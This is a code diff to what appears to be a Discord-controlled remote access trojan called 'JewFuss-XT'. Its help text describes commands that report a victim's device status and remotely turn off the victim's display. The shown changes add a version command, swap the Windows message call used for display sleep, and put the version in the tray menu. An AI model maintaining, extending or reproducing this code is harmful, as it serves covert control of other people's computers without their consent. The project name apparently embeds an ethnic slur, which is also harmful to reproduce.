@@ -48,7 +48,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.8.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.8.3" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
 intents = discord.Intents.all()
@@ -167,10 +167,16 @@ async def prompt(ctx, *, question_and_default: str = ""):
 async def ping(ctx):
     await ctx.send("Pong!")
 
+@bot.command(aliases=["version"], help="Shows current version for JewFuss.", usage="$version")
+async def ver(ctx):
+    global version
+    embed = discord.Embed(color=discord.Color.blue())
+    embed.add_field(name="Version", value=f"`{version}`", inline=False)
+    await ctx.send(embed=embed)    
+
 @bot.command(help="Shows victims device status including uptime, resource usage, etc.", usage="$status")
 async def status(ctx):
     global version
-    
     if True:
         # ── Names
         dev_name = platform.node()
@@ -228,7 +234,7 @@ async def displaysleep(ctx):
 
     async def eepy():
         try:
-            await asyncio.to_thread(ctypes.windll.user32.PostMessageW,0xFFFF,0x0112,0xF170,2)
+            await asyncio.to_thread(ctypes.windll.user32.SendMessageTimeoutW,0xFFFF,0x0112,0xF170,2,0,1000,None)
         except Exception as e:
             await ctx.send(f"Error: {e}")
 
@@ -837,7 +843,7 @@ async def on_guild_join(guild):
 
 @bot.event
 async def on_ready():
-    global tray_icon
+    global tray_icon, version
     in_server_amount = 0
     logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S") + f" (UTC{'-' if (offset := (time.altzone if time.localtime().tm_isdst else time.timezone) // 3600) < 0 else '+'}{abs(offset)})"
 
@@ -871,7 +877,7 @@ async def on_ready():
             return
 
         print("Starting tray icon...")
-        menu = pystray.Menu(pystray.MenuItem("Exit", tray_on_exit_clicked))
+        menu = pystray.Menu(pystray.MenuItem(f"Version: {version}", None), pystray.MenuItem("Exit", tray_on_exit_clicked))
         tray_icon = pystray.Icon("JewFuss-XT", tray_image, TRAY_TITLE, menu)
         tray_icon.title = TRAY_TOOLTIP
         tray_icon.run_detached()
